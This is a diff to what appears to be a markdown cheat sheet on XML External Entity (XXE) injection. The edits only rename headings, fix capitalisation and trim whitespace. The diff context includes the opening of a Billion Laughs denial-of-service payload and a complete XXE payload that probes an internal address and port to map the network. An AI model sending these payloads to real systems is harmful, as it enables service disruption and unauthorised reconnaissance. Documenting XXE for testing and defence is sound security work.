@@ -1,16 +1,17 @@
 # XXE (XML External Entity Injection)
 
 ## Table of Contents
-- [DoS](#dos)
+
+- [Denial of Service](#denial-of-service)
 - [Arbitrary File Read](#arbitrary-file-read)
 - [Reconnaissance](#reconnaissance)
 - [SSRF](#ssrf)
 
-## DoS
+## Denial of Service
 
 ### It can lead to excessive resource usage on the server, causing service interruptions.
 
-- Billion Laughs Attack
+- Billion laughs attack
     ```xml
     <?xml version="1.0"?>
     <!DOCTYPE lolz [
@@ -39,11 +40,11 @@
 
 ### It can be used for internal network mapping.
 
-- port scanning
+- Port scanning
     ```xml
     <?xml version="1.0"?>
     <!DOCTYPE foo [
-        <!ENTITY xxe SYSTEM "http://192.168.0.1:8080"> 
+        <!ENTITY xxe SYSTEM "http://192.168.0.1:8080">
     ]>
     <foo>&xxe;</foo>
     ```
